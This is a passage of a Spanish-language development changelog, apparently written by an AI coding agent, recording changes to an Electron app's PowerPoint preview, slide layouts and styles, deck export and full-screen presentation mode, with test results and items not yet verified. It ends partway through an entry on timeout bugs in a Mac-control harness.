  concreto y visualmente confirmado de por medio (no otra ronda de "debería estar mejor").

## F8-B132 — Vista previa de PowerPoint vía LibreOffice: el render REAL, no una aproximación

- **El dueño, con el arnés ya mostrando un deck prolijo, preguntó por qué seguía "viéndose mal"** en
  casos puntuales, y después de una vuelta de ida y vuelta sobre si valía la pena ("pero dejalo al
  nivel de Claude") se confirmó el camino: en vez de seguir sumando atributos de OOXML al visor
  estructural (transparencia, geometría, fondo, tipografía, espaciado — F8-B128 a F8-B131), usar
  LibreOffice para convertir el `.pptx` real a PDF y mostrar ESE PDF con el visor de PDF que ya existe
  (pdf.js) — el render de verdad, no una aproximación hecha a mano.
  - **Instalado y probado empíricamente en este Mac** (`brew install --cask libreoffice`, con permiso
    explícito del dueño — el propio sistema bloqueó el intento automático por ser una instalación de
    software, así que lo corrió él mismo): `soffice --headless --convert-to pdf` tardó **2.5s en frío,
    ~1.3s en caliente**, y el PDF resultante sale **pixel a pixel igual a PowerPoint real** — círculo
    de textura, tipografía, espaciado entre letras, todo. Mucho mejor y más rápido de lo que la
    investigación teórica anterior (F8-B127) había estimado.
  - **Aclaración importante que pidió el dueño**: esto SOLO cambia la VISTA PREVIA dentro del panel.
    Lo que se descarga (`downloadChatDoc`) vuelve a generar el `.pptx` real desde cero, siempre — un
    archivo completamente editable en PowerPoint, nunca el PDF. Son dos caminos de código
    completamente separados; confirmado leyendo `extras-handlers.ts` antes de tocar nada: el botón de
    descargar ya manda su propio pedido con `kind:'pptx'` explícito, sin depender de lo que haya
    generado la vista previa.
  - Nuevo `src/main/extras/office-render.ts`: `findSoffice()` (busca en rutas típicas de Mac/Windows,
    cae a `which`/`where` del PATH, cacheado) y `convertToPdf()` (perfil de usuario temporal propio
    por conversión — así varias conversiones a la vez no se bloquean entre sí por compartir perfil —,
    con un timeout de 20s; `null` ante CUALQUIER falla, nunca lanza).
  - **`chat-docs.ts`**: `generateChatDoc`, para `kind:'pptx'`, intenta `convertToPdf` después de
    escribir el archivo; si da una ruta, el token queda con `kind:'pdf'` apuntando al PDF en vez de al
    `.pptx`. Sin LibreOffice (o si la conversión falla por lo que sea), cae con gracia al
    comportamiento de siempre — nunca rompe la generación.
  - **Cero cambios en el renderer**: confirmado que la etiqueta del panel ("· PowerPoint") y el botón
    de descarga sacan su `kind` del BLOQUE del chat (`pptx`), no de lo que main termina sirviendo
    — así que la persona sigue viendo "PowerPoint" en el encabezado aunque el visor que se monte por
    dentro sea el de PDF. `App.tsx` (el router del visor) ya elegía el componente según el `kind` que
    manda la URL del token — sin tocar nada ahí tampoco.
  - **Nunca se empaqueta ni se descarga solo** (sigue la decisión de la investigación de F8-B127): si
    la persona que use la app NO tiene LibreOffice instalado, cae con gracia al visor estructural de
    siempre — este camino es un "mejor si está", no un requisito nuevo.
- **Pruebas nuevas**: `office-render.test.ts` (8, con `child_process`/`fs/promises` mockeados —
  deterministas, no dependen de si la máquina que corre los tests tiene LibreOffice instalado de
  verdad): detección por ruta típica/`which`, cacheo, conversión exitosa/fallida/timeout, perfil
  temporal que no se puede crear. `chat-docs.test.ts` sumó 3 (con `convertToPdf` mockeado: éxito →
  `kind:'pdf'`, falla → cae a `kind:'pptx'`, xlsx nunca llama a `convertToPdf`) — el test viejo de
  "pptx da kind pptx" se reescribió para no depender de si ESTA máquina en particular tiene
  LibreOffice instalado (ahora sí, por la instalación de recién) — antes fallaba por eso mismo, dato
  real de por qué hacía falta mockearlo en vez de confiar en el entorno.
- **Verificado**: typecheck (`node`) limpio, lint limpio (mismos warnings preexistentes, ajenos),
  prettier limpio, batería completa del repo en verde — 5982 pruebas (23 skipped, Windows-only),
  mismo ruido ajeno de siempre (`computer/service-win.test.ts` en Mac). App reiniciada (se tocó
  `chat-docs.ts`/`office-render.ts` en main; no se tocó `src/viewer/`, así que no hizo falta
  `npm run build:viewer` esta vez).
- **No verificado todavía**: confirmación del dueño viendo el panel con LibreOffice de verdad detrás.
  Pendiente para una fase futura (no esta vuelta): el ciclo de revisión con VISIÓN (el modelo mira la
  imagen renderizada y corrige errores de geometría antes de mostrarla) que investigó F8-B127 — esto
  de hoy es "mostrar el render real", no "el modelo se corrige solo"; dado que el propio `fitText`
  determinista viene andando razonablemente bien (verificado con números, no solo capturas), invertir
  en el loop de visión queda con prioridad más baja por ahora.

## F8-B133 — Nuevo layout "kpis" (fila de métricas): la causa real de "siempre la misma estética"

- **El dueño comparó directamente, en PowerPoint real, nuestro archivo contra uno generado por Claude
  Desktop con el mismo tipo de contenido** ("funciona del hoyo wn siempre hace la misma puta estética
  no cambia no varía", con ambos `.pptx` en el Escritorio) — la referencia de Claude Desktop traía una
  diapositiva que no existía en nuestro set de layouts: una fila de 2 a 4 métricas (etiqueta/número
  grande/variación), tipo tablero — lo que en la jerga de reportes se llama "KPI row". Sin ese layout,
  cualquier deck con ese tipo de contenido caía siempre en el mismo molde de título+viñetas, de ahí la
  sensación de "nunca varía" aunque el resto de layouts (`stat`/`steps`/`two-col`/`cards`/`chart`) ya
  estuvieran todos implementados.
  - **Nuevo layout `"kpis"`**: `spec.kpis` es un array de 2 a 4 `{label, value, delta?}` — cada métrica
    sale como una tarjeta (`roundRect` con borde y fondo `surface`) en fila, con la etiqueta chica
    arriba, el número grande en el medio y la variación (si viene) abajo en el color de acento. Con
    menos de 2 `kpis`, cae con gracia al layout `"bullets"` de siempre (igual que el resto de layouts
    con datos faltantes) — nunca se arma una fila vacía o de una sola tarjeta.
  - **Esquema**: `src/shared/chat-doc-spec.ts` gana `PptxKpiSpec`, `isKpiSpec()`,
    `MAX_KPIS=4`/`MIN_KPIS=2`/`MAX_KPI_LABEL_CHARS=40`/`MAX_KPI_VALUE_CHARS=16`/`MAX_KPI_DELTA_CHARS=40`,
    y `"kpis"` se suma a `PPTX_LAYOUTS`. `src/main/ipc/schemas.ts` gana el validador IPC equivalente
    (`pptxKpi`/`pptxKpis`) — mismo patrón que `columns`/`eyebrow`/`note` de rondas anteriores.
  - **Render**: `src/main/extras/render-pptx.ts` gana `addKpisSlide()` sobre el mismo sistema de diseño
    de F8-B129 (paleta de 14 tonos, `addContentHeader` compartido, pie de página) — ancho de cada
    tarjeta calculado según cuántas `kpis` vengan (2, 3 o 4), nunca un tamaño fijo que se vea apretado
    o vacío.
  - **Verificado visualmente contra la referencia real**: se armó un `.pptx` de prueba con el mismo
    contenido de ejemplo del archivo de Claude Desktop (ventas totales/clientes nuevos/retención),
    convertido a PDF vía la integración de LibreOffice de F8-B132 y comparado lado a lado — la
    composición (fila de tarjetas, jerarquía label/número/variación) queda equivalente a la
    referencia; detalle de paleta/tipografía sigue el tema elegido, no copia los colores exactos del
    archivo ajeno.
  - **Prompt del agente actualizado en los dos lugares sincronizados**
    (`resources/opencode/agents/chat.md` y `src/main/opencode/config.ts`): se documenta `"kpis"` en la
    lista de `layout`, su forma exacta (`kpis: [{label, value, delta?}]`), la distinción explícita con
    `"stat"` (UNA cifra foco de toda la diapositiva vs. VARIAS métricas juntas más chicas) y se agrega
    a la lista de "variá el tipo de diapositiva para que no se vea hecho por IA".
- **Pruebas nuevas**: `chat-doc-spec.ts`/`schemas.ts` — aceptación de 2 a 4 `kpis`, rechazo de 1 o 5,
  rechazo de `kpi` sin `label`/`value` (con el ciclo de borrar-con-`sed`-y-restaurar de siempre para
  confirmar que el test de verdad habría fallado sin el campo declarado). `render-pptx.test.ts` suma 2:
  el layout `"kpis"` con 2 a 4 métricas arma las tarjetas y textos esperados, y con menos de 2 cae a
  `"bullets"`.
- **Verificado**: typecheck (los 4: node/web/pwa/viewer) limpio, lint limpio (mismos 8 warnings
  preexistentes y ajenos de siempre), batería completa del repo en verde — 5862 pruebas (23 skipped,
  Windows-only), mismo ruido ajeno de siempre (`computer/service-win.test.ts`, `ENOEXEC` en Mac). App
  reiniciada (se tocó `chat-doc-spec.ts`/`schemas.ts`/`render-pptx.ts` en main; no se tocó
  `src/viewer/`, así que no hizo falta `npm run build:viewer` esta vez).
- **No verificado todavía**: confirmación del dueño viendo la fila de KPIs dentro de la app con un
  pedido real (el layout no se infiere solo, hay que pedirlo a propósito — mismo criterio que
  `stat`/`steps`/etc. — p.ej. "un resumen con las métricas principales en fila" o "ventas totales,
  clientes nuevos y retención en una fila al principio").

## F8-B134 — Eje de "estilo" en PowerPoint: por qué nunca variaba de verdad, y qué se hizo

- **El dueño insistió, en rondas sucesivas, en que la presentación "siempre hace la misma estética"**
  ("cambiale los colores y formato", "cambiame la estética total compadre", "porque la estetica es
  igual no la varia como que la ia estuviera manipulada o capeada") — pidió investigar cómo lo hacen
  Claude.ai/ChatGPT/Codex y, en base a eso, decidir qué hacer.
  - **Confirmado leyendo el código, no por sospecha**: `render-pptx.ts` solo tenía DOS perillas por
    diapositiva — `theme` (5 paletas de color fijas) y `layout` (10 plantillas con geometría 100% fija
    en código) — nunca tipografía de forma, decoración, bordes de tarjeta ni alineación. El agente
    nunca controlaba posición ni forma, solo contenido + qué layout usar — de ahí que "cambiar la
    estética" en la práctica solo pudiera recolorear.
  - **Por qué Claude.ai/ChatGPT/Codex sí logran "cualquier estilo"**: corren código (python-pptx/
    openpyxl) en un sandbox, con libertad real de posición/forma, y antes de entregar el archivo hacen
    una vuelta de "generar → renderizar → mirar con visión → corregir" que detecta y arregla
    superposición/desborde. **Se revisó si Lazunox ya tiene esa vuelta en algún lado — no la tiene**:
    ni el Chat de hoy (agente de texto plano, sin terminal ni archivos, por diseño) ni la skill `pptx`
    de modo Tareas (revisada: es una plantilla de una sola pasada: ni siquiera puede abrir el archivo
    para mirarlo en su propio sandbox). Replicar eso de cero es un proyecto bastante más grande (nueva
    capacidad de visión en el loop del agente) y reintroduce el riesgo real que ya se vio esta sesión
    (títulos cortados, texto encimado en la diapositiva 6) mientras se afina — se dejó anotado como
    fase futura, no esta vuelta.
  - **Decisión tomada**: en vez de eso, un eje de ESTILO real (forma/decoración/tipografía),
    independiente del color, manteniendo intacta toda la matemática de posición/tamaño que ya
    funciona bien — nunca se tocó un solo `x`/`y`/`w`/`h`, solo qué parámetros de dibujo se usan en
    las mismas llamadas de `addShape`/`addText`.
  - **Nuevo `src/main/extras/pptx-design.ts`**: `StyleParams` (`bleedShape`, `cardRadius`,
    `cardBorder`, `cardFill`, `titleAlign`, `ruleUnderEyebrow`, `numberBadge`) y `STYLES` con 4
    valores — `"classic"` (el look de siempre, DEFAULT — cero cambio visual para quien no pide nada
    nuevo), `"editorial"` (línea fina de borde a borde en vez del círculo, tarjetas de esquina recta
    sin relleno — tono revista/sobrio), `"geometric"` (barra diagonal de acento, tarjetas bien
    redondeadas tipo "pill" — tono gráfico/audaz), `"minimal"` (sin ninguna decoración, tarjetas de
    esquina recta solo con borde — tono informe ejecutivo ultra limpio).
  - **`render-pptx.ts`**: `StyleParams` se enhebra junto a `Palette` en cada `addXxxSlide`.
    `addBleedCircle` se generalizó a `addBleedDecoration` (círculo/diagonal/línea/nada, en la MISMA
    zona de esquina ya probada que nunca pisa texto). `addEyebrow` ganó un "tick" de color opcional a
    la IZQUIERDA de la etiqueta (NUNCA una línea debajo: en "section"/"closing" el espacio entre
    etiqueta y título ya es chico — ver sus propios `y` — y una línea ahí arriesgaba pisar el título;
    un tick al costado no compite por espacio vertical). `addCardsSlide`/`addKpisSlide` pasan a usar
    `s.cardRadius`/`cardBorder`/`cardFill`. `addStepsSlide`/`addCardsSlide` respetan `s.numberBadge`.
    `addTwoColSlide` queda sin cambios de estilo (sus paneles son el contraste antes/después con el
    color del tema, no "tarjetas").
  - **Bug real encontrado con la verificación visual, no solo con el XML** (disciplina ya establecida
    esta sesión tras el bug del `9cqw`, F8-B131): `rectRadius: 0` en `pptxgenjs` NUNCA llegaba al
    archivo — confirmado leyendo su fuente, el chequeo es `if (slideItemObj.options.rectRadius)`, y
    `0` es falsy en JS, así que nunca escribía el `adj` de la esquina; PowerPoint/LibreOffice caía al
    radio PROPIO del preset `roundRect` (visiblemente redondeado), no a la esquina recta que pedían
    `"editorial"`/`"minimal"`. Se vio clarísimo generando un `.pptx` real por estilo, convirtiéndolo a
    PDF con la integración de LibreOffice (F8-B132) y mirando el render de verdad — las aserciones de
    XML por sí solas no lo habrían agarrado. Arreglado con un `cardShape(s)` que usa `"rect"` liso en
    vez de `"roundRect"` cuando `cardRadius` es 0.
  - **Prompt del agente, los dos lugares sincronizados** (`chat.md`/`config.ts`): `style` documentado
    junto a `theme`, con una frase por valor y cuándo pega cada uno; la guía de variedad ahora pide
    variar AMBOS ejes ("no dejes ni 'blue' ni 'classic' por inercia").
- **Pruebas nuevas**: `pptx-design.test.ts` suma un describe para `STYLES` (los 4 existen, rangos
  válidos). `render-pptx.test.ts` suma 4: sin `style` el resultado es byte-idéntico a `style:
"classic"` (cero regresión), la decoración de cover/section/stat/closing cambia según el estilo
  (incluida la verificación explícita de `"rect"` liso vs. `"roundRect"` para radio 0, tras encontrar
  el bug de arriba), la forma de tarjeta en `cards`/`kpis` cambia (radio/relleno/borde), y el valor
  por defecto se comporta como `"classic"` aunque se declare explícito.
- **Verificado**: typecheck (los 4) limpio, lint limpio (mismos 8 warnings preexistentes y ajenos),
  batería completa del repo en verde — 5872 pruebas (23 skipped, Windows-only), mismo ruido ajeno de
  siempre (`computer/service-win.test.ts`, `ENOEXEC` en Mac). Verificación visual manual: un `.pptx`
  por estilo con el mismo contenido (portada/KPIs/tarjetas), convertido a PDF vía LibreOffice y
  revisado página por página — confirmada la decoración distinta en cada uno, el bug del radio 0
  encontrado y corregido, y ninguna superposición/corte de texto en ningún estilo. App reiniciada (se
  tocó `render-pptx.ts`/`pptx-design.ts`/`chat-doc-spec.ts`/`schemas.ts` en main; no se tocó
  `src/viewer/`, así que no hizo falta `npm run build:viewer`).
- **No verificado todavía**: confirmación del dueño generando las 4 combinaciones de estilo en la app
  y abriéndolas en PowerPoint real (no solo el visor/LibreOffice).

## F8-B135 — Descargar un deck `​```slides` como PowerPoint proyectable (imagen por diapositiva)

- **El dueño pidió que el camino HTML libre (`​```slides`, mejor estética que el `​```pptx`
  estructurado) pudiera además abrirse en PowerPoint y proyectarse** — "que tenga la misma función
  que Claude [Desktop], que deje proyectarlo" — poniendo como referencia a Gamma.app.
  - **Investigado cómo lo hace Gamma antes de construir nada**: tampoco genera `.pptx` nativo —
    renderiza en su propio canvas web y exporta como conversión secundaria; sus propios usuarios
    reportan en su foro oficial diapositivas que llegan como una sola imagen bloqueada o con texto
    fragmentado. Confirma que ni siquiera una empresa dedicada 100% a esto tiene resuelto el "texto
    de verdad editable después" — mismo límite real que ya se había encontrado.
  - **Confirmado con el dueño** (pregunta directa): no hace falta que el texto quede editable en
    PowerPoint después, alcanza con que el archivo se abra y se proyecte en pantalla completa como
    cualquier `.pptx` normal — habilita el camino simple y confiable (imagen por diapositiva) en vez
    de perseguir la conversión "elemento por elemento" que ni Gamma logra resolver.
  - **Dos agentes Explore confirmaron, antes de diseñar nada**: el contrato CSS que ya se le pide al
    agente (`.slide { width:960px; height:540px; page-break-after:always }`, apiladas en flujo NORMAL
    de documento, nunca `position:absolute` entre ellas) — así que aislar una diapositiva por vez es
    seguro; y que `​```slides` colapsaba a `kind:'pdf'` IDÉNTICO a un `​```html` cualquiera en TODA la
    cadena (renderer→IPC→main), sin ninguna marca de "es un deck" que sobreviviera más allá del
    fence-lang local — hubo que hacerla sobrevivir a propósito (ver abajo).
  - **Nuevo `captureSlidesAsPngs`** (`src/main/extras/artifact-window.ts`): misma ventana oculta/
    sandboxeada/CSP que `renderHtmlToPdf` (se duplicó su bloque de creación a propósito, en vez de
    refactorizar para compartirlo, para no arriesgar ese camino que ya funciona), a 1920×1080 con
    zoom 2x (diapositivas de 960×540 lógicos salen nítidas). Aísla una diapositiva por vez ocultando
    el resto (`style.display`) en vez de scrollear por offset fijo: no depende de que la altura de
    cada `<section>` calce exacto en píxeles — un `padding` sin `box-sizing:border-box` en el HTML
    del agente habría roto un scroll por offset. Si el HTML no sigue el contrato `.slide` (0
    encontradas), captura la página entera como una sola "diapositiva" — nunca falla por eso, degrada
    con gracia (mismo criterio que la integración de LibreOffice, F8-B132).
  - **Nuevo `src/main/extras/slides-deck-pptx.ts`**: `assembleSlidesPptx(images)`, PURO (sin
    `electron`, a propósito — así se prueba con buffers de prueba, sin necesitar una `BrowserWindow`
    real) — cada imagen a pantalla completa (`x=0,y=0`, 10×5.625in, mismo 16:9 que `render-pptx.ts`)
    en su propia diapositiva, sin texto ni forma.
  - **Nuevo `src/main/extras/slides-deck-export.ts`**: `downloadSlidesAsPptx` orquesta captura →
    armado → el mismo diálogo nativo "Guardar como" que ya usa `downloadHtmlAsPdf` (destino SIEMPRE
    lo elige la persona). Nombre de archivo DISTINTO de `render-pptx.ts` a propósito: ese otro archivo
    arma el `​```pptx` ESTRUCTURADO (temas/estilos de F8-B129/F8-B134) — un mecanismo totalmente
    distinto, nunca usado a la vez que `​```slides` para el mismo documento.
  - **Plumbing para que "es un deck" sobreviva hasta el botón**: `isSlides` ahora viaja desde
    `extractHtmlArtifacts` (`ArtifactButton.tsx`) → `ChatDocBlock` (`chatDocBlocks.ts`) →
    `previewInChatDocPanel`/`openDoc` (`chatDocPreview.ts`/`useChatDocPanel.ts`) → el estado `doc` que
    lee `ChatDocPanel.tsx`. El `kind` IPC (`'pdf'`) NO cambió — la vista previa sigue exactamente
    igual; `isSlides` es pura información de UI para decidir qué botón de descarga extra mostrar.
  - **Botón nuevo `DownloadSlidesPptxButton`** (`ArtifactButton.tsx`, mismo patrón que
    `DownloadPdfButton`): visible SOLO cuando `isSlides` es `true`, al lado del de PDF, en los dos
    lugares donde ese botón ya aparece (cabecera inline del bloque de código y header del panel
    lateral). Tooltip explícito "para proyectar" (nueva clave `labels.ui.downloadSlidesPptx`,
    es/en) para que no se confunda con "editable".
  - **Prompt del agente: SIN CAMBIOS** — mismo criterio ya establecido para el botón de PDF ("la
    persona ya tiene un botón... no hace falta que lo sepas ni lo menciones"): es un descubrimiento
    de UI, no algo que el agente deba promocionar.
  - **Nuevo canal IPC `extras:downloadSlidesAsPptx`** (`ipc-extras.ts`/`schemas.ts`/
    `extras-handlers.ts`/`preload/extras-api.ts`), mismo shape que `extras:downloadHtmlAsPdf`
    (`{title, html}` → ruta guardada o `null`). Clasificado `'X'` (no accesible desde control remoto)
    en `remote/policy.ts`, mismo criterio que el canal de PDF — lo agarró la prueba de cobertura 100%
    de canales (`policy.test.ts`), que obliga a clasificar cada canal nuevo explícitamente.
- **Pruebas nuevas**: `slides-deck-pptx.test.ts` (3, puras — PNG de prueba de 1×1, confirma vía
  `JSZip` una diapositiva por imagen en orden, cada una a pantalla completa en EMU exacto, sin ningún
  `<a:t>` de texto). `captureSlidesAsPngs`/`downloadSlidesAsPptx` dependen de una `BrowserWindow`
  real — mismo criterio que `renderHtmlToPdf`, que tampoco tiene test unitario.
- **Verificado**: typecheck (los 4) limpio, lint limpio (mismos 8 warnings preexistentes), batería
  completa del repo en verde — 5876 pruebas (23 skipped, Windows-only), mismo ruido ajeno de siempre
  (`computer/service-win.test.ts`, `ENOEXEC` en Mac). `i18n-core-keys.json` (cobertura del núcleo de
  i18n que carga la PWA al arrancar) regenerado con `UPDATE_PWA_I18N=1` — el diff trajo además 24
  claves que ya estaban en uso pero no se habían sincronizado en rondas anteriores (`chat.doc.*`,
  `tasks.learn.*`, `common.close`, `labels.ui.downloadPdf`), nunca una resta, confirmado antes de
  aceptarlo. App reiniciada (se tocó main/preload/renderer).
- **No verificado todavía — requiere interacción real con una ventana de Electron, no automatizable**:
  generar un `​```slides` de verdad en la app, apretar "Descargar como PowerPoint (para proyectar)", y
  abrir el `.pptx` resultante en PowerPoint/Keynote de verdad — confirmar que cada diapositiva
  coincide con el HTML y que entra en modo presentación sin problema. Pendiente de que el dueño lo
  pruebe (mismo motivo que para instalar LibreOffice en F8-B132: esto necesita manos reales en la app,
  no algo que se pueda automatizar desde acá sin tocar la ventana en vivo del dueño).

## F8-B136 — Dos bugs reales de la captura de diapositivas (F8-B135) + "Presentar" dentro de Lazunox

- **El dueño probó F8-B135 en la app de verdad y encontró DOS bugs reales** que ninguna prueba
  automática podía agarrar (necesitan una `BrowserWindow` real, ya se había anotado esa limitación en
  F8-B135) — y de paso aclaró que lo que en el fondo necesitaba no era un archivo `.pptx`, sino poder
  **proyectar la presentación DENTRO de Lazunox**, sin pasar por PowerPoint.
  - **Bug 1 — la captura se quedaba esperando para siempre**: `capturePage()` (a diferencia de
    `printToPDF()`, que sí funcionaba) necesita que la ventana esté REALMENTE compositada por
    Chromium; con `show:false` sola, Chromium nunca llega a pintar un frame de una ventana invisible
    (lo salta para ahorrar recursos) y la captura no resolvía nunca. Arreglado con el mismo truco que
    ya usa el modo E2E sin pantalla de la propia app (`e2e-headless.ts`'s `presentWindow`): opacidad 0
    - sin eventos de mouse + `showInactive()` — invisible para la persona, pero el compositor la trata
      como una ventana real.
  - **Bug 2 — intentar más nitidez con zoom deformaba las diapositivas**: se había agregado
    `setZoomFactor(2)` DESPUÉS de que la página ya maquetó a tamaño normal, así que cualquier elemento
    medido por JS (p.ej. un gráfico) quedaba calculado para un tamaño y pintado en otro — estirado/
    desformado. Arreglado sacando el zoom por completo: la ventana nace 1:1 con el contrato CSS del
    agente (960×540), sin ningún truco — mismo criterio que `renderHtmlToPdf`, que tampoco hace zoom.
  - **Bug 3 (encontrado al arreglar el 1) — posicionar la ventana fuera de pantalla rompía la
    nitidez**: para garantizar que la ventana de captura nunca se viera, además de la opacidad 0 se la
    posicionaba en coordenadas muy negativas (fuera de cualquier monitor real). Eso le hacía perder a
    Electron la referencia de qué pantalla usar, y caía a densidad de píxeles 1x en vez de la 2x
    (Retina) del monitor real del dueño — las imágenes salían sin nitidez. Arreglado sacando el
    posicionamiento fuera de pantalla: la opacidad 0 + `showInactive()` ya alcanzan solas para que
    nunca se vea, sin perder la densidad real de la pantalla.
  - **"Presentar" dentro de Lazunox (lo que el dueño en realidad pedía)**: nuevo botón `Presentation`
    (ícono distinto al de "Descargar PowerPoint", para no confundirlos — el dueño pidió explícitamente
    mantener los dos) junto al bloque `​```slides` en el chat. Al apretarlo, abre el panel de documento
    (si no estaba abierto) y pone la VENTANA PRINCIPAL en pantalla completa de VERDAD del sistema
    operativo (`BrowserWindow.setFullScreen(true)`, no solo el panel adentro de la ventana) mostrando
    el HTML/PDF real — sin ninguna captura de imagen de por medio, así que siempre nítido, a
    diferencia del camino de descarga. Se sale con Escape (ya había un listener de Escape del visor
    nativo, reusado) o cerrando el panel.
    - El botón de "ampliar" que ya existía en el header del panel (`Maximize2`/`Minimize2`) también
      entra/sale de pantalla completa de verdad del SO ahora, pero SOLO cuando el documento es un
      `​```slides` — para cualquier otro tipo (PDF normal, Excel, PowerPoint estructurado) sigue
      siendo nada más que "ampliar dentro de la ventana", como siempre: no tiene sentido "proyectar"
      una planilla de cálculo.
  - **Nuevo canal IPC `extras:chatDoc:setHostFullscreen`** (`ipc-extras.ts`/`schemas.ts`/
    `extras-handlers.ts`), clasificado `'X'` en `remote/policy.ts` (mismo criterio que el resto de
    `chatDoc:*`). `previewInChatDocPanel`/`openDoc` ganaron un parámetro `present` — al terminar de
    generarse el documento, si se pidió presentar, entra en pantalla completa automáticamente (no
    hace falta esperar a que la persona aprete otro botón más).
- **Verificado**: typecheck (los 4) limpio, lint limpio (mismos 8 warnings preexistentes), batería
  completa del repo en verde — 5877 pruebas (23 skipped, Windows-only), mismo ruido ajeno de siempre
  (`computer/service-win.test.ts`, `ENOEXEC` en Mac). `i18n-core-keys.json` regenerado con
  `UPDATE_PWA_I18N=1` (una clave nueva, `labels.ui.presentSlides`). App reiniciada.
- **No verificado todavía — requiere interacción real con la app, no automatizable**: que el dueño
  confirme que (a) el `.pptx` descargado ahora sale nítido y sin deformar, y (b) el botón "Presentar"
  realmente pone la pantalla completa y se ve la presentación de verdad, saliendo bien con Escape.

## F8-B137 — "Presentar" rehecho: ventana propia, no la ventana principal

- **El dueño probó el "Presentar" de F8-B136 y mandó una captura**: al apretarlo, la ventana principal
  seguía mostrando el sidebar de Lazunox, los controles de zoom/página del visor de PDF y el resto del
  chrome de la app — no se parecía en nada a una presentación. El diseño de F8-B136 (poner la ventana
  PRINCIPAL en pantalla completa del sistema, reusando el panel lateral) estaba mal de raíz: pantalla
  completa del sistema operativo solo hace que LA VENTANA ocupe toda la pantalla — no oculta nada de
  lo que esa ventana ya dibuja adentro (el sidebar de navegación, que vive en `App.tsx`, está fuera
  del control de `ChatView`/el panel de documento). Mientras sea "la app entera", nunca se iba a ver
  como una presentación de verdad, sin importar cuánto se ocultara adentro del panel.
  - **Rediseño**: `presentSlides()`, nueva función en `artifact-window.ts` — una ventana PROPIA (no la
    principal), sin marco, que carga el HTML del deck (misma sesión/CSP aislada que `openArtifact`) y
    apenas termina de cargar: inyecta un ajuste de escala (`document.body.style.zoom`, calculado como
    `min(ancho pantalla/960, alto pantalla/540)` — mantiene la proporción 16:9 del contrato CSS del
    agente, con barras negras si la pantalla no es exactamente 16:9) y entra en pantalla completa de
    verdad. Como es una ventana APARTE que solo tiene el HTML, no hay nada de la app que ocultar —
    nunca se ve ni el sidebar ni ningún control.
    - Sale con Escape (mismo patrón `before-input-event` que ya usa el visor nativo) o con los
      controles de pantalla completa del propio sistema operativo (`leave-full-screen` cierra la
      ventana — no tiene sentido fuera de pantalla completa, es sin marco y sin controles propios).
  - **Se dio de baja el intento anterior**: el canal IPC `extras:chatDoc:setHostFullscreen`, el
    parámetro `present` de `previewInChatDocPanel`/`openDoc`, y el `doc?.isSlides` especial del botón
    de "ampliar" del panel — todo relacionado a poner la ventana PRINCIPAL en pantalla completa.
    Reemplazado por el nuevo canal `extras:presentSlides` (mismo payload que `downloadHtmlAsPdf`:
    `{title, html}` → `void`), clasificado `'X'` en `remote/policy.ts`.
  - El botón "Presentar" (mismo ícono `Presentation`) ahora llama directo a `extras.presentSlides(...)`
    — ya no depende de que el panel esté abierto ni de ningún estado de React compartido. Sigue
    disponible en los dos lugares de antes (el bloque del chat y el header del panel, por si ya estaba
    abierto), ambos llaman a la misma función nueva.
- **Verificado**: typecheck (los 4) limpio, lint limpio, batería completa del repo en verde — 5877
  pruebas (23 skipped, Windows-only), mismo ruido ajeno de siempre (`ENOEXEC` en Mac). `policy.test.ts`
  (cobertura 100% de canales) y `i18n-core.test.ts` en verde con el canal/claves nuevos. App reiniciada.
- **No verificado todavía — requiere interacción real con la app**: que el dueño confirme que ahora sí
  se ve como una presentación de verdad (pantalla negra, solo la diapositiva, sin nada de la app
  alrededor), que escala bien a su pantalla, y que Escape/salir de pantalla completa cierra limpio.

## F8-B138 — "Presentar": una diapositiva por vez, con flechas, no scroll hacia abajo

- **El dueño: "me gusta pero la idea es que sea como presentación para el lado, no para abajo, como si
  fueran diapositivas"** — F8-B137 ya mostraba la ventana propia en pantalla completa, pero las
  diapositivas quedaban todas apiladas en flujo normal (igual que en el PDF) y la única forma de
  avanzar era scrollear hacia abajo por una página larga — no se sentía como una presentación de
  verdad, donde se avanza diapositiva por diapositiva.
  - Mismo truco ya probado en `captureSlidesAsPngs` (F8-B135): el script que se inyecta en
    `presentSlides` ahora oculta todas las `.slide` menos la actual (`display:none`), mostrando una
    sola a pantalla completa por vez. Flecha derecha, espacio o clic avanzan; flecha izquierda
    retrocede — nunca pasa de la primera ni de la última. El `body` pasa a `display:flex` centrado,
    así la diapositiva visible queda centrada en pantalla (antes, sin esto, con letterboxing quedaba
    pegada arriba a la izquierda en vez de centrada).
- **Verificado**: typecheck limpio, lint limpio (mismos 8 warnings preexistentes). Sin cambios de
  tipos ni de superficie IPC (todo el cambio es el script JS inyectado dentro de `presentSlides`), así
  que no hace falta tocar pruebas existentes. App reiniciada.
- **No verificado todavía — requiere interacción real con la app**: que el dueño confirme que ahora
  avanza diapositiva por diapositiva con las flechas/clic, centrada, y no como una página larga.

## F8-B139 — "Presentar": la diapositiva no quedaba bien encuadrada

- **El dueño: "no las cuadra bien como diapositivas"** tras F8-B138 — bug real en el script de ajuste:
  el `zoom` se aplicaba directo sobre `body`, el mismo elemento que tenía que centrarse con flexbox a
  `100vw`/`100vh` — mezclar `zoom` con unidades de viewport en el MISMO elemento lo descuadraba (el
  `body` nunca llegaba a medir el ancho real de la pantalla, así que no había nada que centrar).
  - Separado: `body` queda SIN zoom, a tamaño real de pantalla (`width:100vw;height:100vh`), y centra
    con flexbox a la diapositiva adentro; el `zoom` se aplica ahora directo a cada `.slide` (el
    elemento con el tamaño fijo de 960×540 del contrato del agente) — la diapositiva se escala, el
    contenedor la centra, cada uno en su propio elemento, sin pisarse.
- **Verificado**: typecheck limpio. Sin cambios de tipos/IPC (solo el script JS inyectado). App
  reiniciada.
- **No verificado todavía — requiere interacción real con la app**: que el dueño confirme que ahora sí
  queda bien encuadrada/centrada en su pantalla.

## F8-B140 — Cowork (Control del Mac): por qué Claude lo logra y nosotros no — primera tanda de arreglos reales

- **El dueño comparó una tarea real** ("conectate a un PC remoto por Windows App y creame una carpeta")
  corrida en Claude (salió bien) contra la misma corrida en Lazunox (falló con varios errores) —
  "¿usaron la misma IA?" Se investigó a fondo (agente Opus, documentación pública de Anthropic +
  lectura real del código de `src/main/computer/`) antes de tocar nada: **no es el modelo, son bugs
  reales y concretos en el harness de Lazunox**, confirmados con cita exacta de archivo:línea.
  - **Bug 1 (el más grave, encontrado primero) — timeout de 15s aplicado a TODO, incluidas las
    tarjetas que esperan al dueño**: OpenCode aplica un único valor de timeout a cada llamada al MCP
    de Control del Mac — no hay uno aparte por herramienta. `request_access`/`request_full_control`/
    `teach_step` esperan sin límite a que el dueño responda una tarjeta (dice el propio código:
